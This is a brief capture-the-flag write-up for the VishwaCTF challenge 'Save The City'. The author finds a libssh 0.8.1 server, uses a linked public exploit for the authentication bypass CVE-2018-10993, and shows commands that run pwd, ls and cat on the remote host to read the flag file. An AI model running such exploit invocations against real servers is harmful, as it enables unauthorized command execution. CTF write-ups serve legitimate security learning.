### Save The City
#### Description
```
The RAW Has Got An Input That ISIS Has Planted a Bomb Somewhere In The Pune! Fortunetly, RAW Has Infiltratrated The Internet Activity of One Suspect And They Found This Link. You Have To Find The Location ASAP!
```
#### Writeup
Firing up the nc command provided results in the following banner:
`SSH-2.0-libssh_0.8.1`
A quick search reveals known authentication bypass vulnerability CVE-2018-10993. Using a [script](https://gist.github.com/mgeeky/a7271536b1d815acfb8060fd8b65bd5d) to do the job: 
```bash
$ python cve-2018-10993.py -p 32378 -c pwd 13.234.11.113
$ python cve-2018-10993.py -p 32378 -c ls 13.234.11.113
$ python cve-2018-10993.py -p 32378 -c 'cat location.txt' 13.234.11.113
```
Finally outputs `elrow-club-pune`.

#### FLAG : `VishwaCTF{elrow-club-pune}`
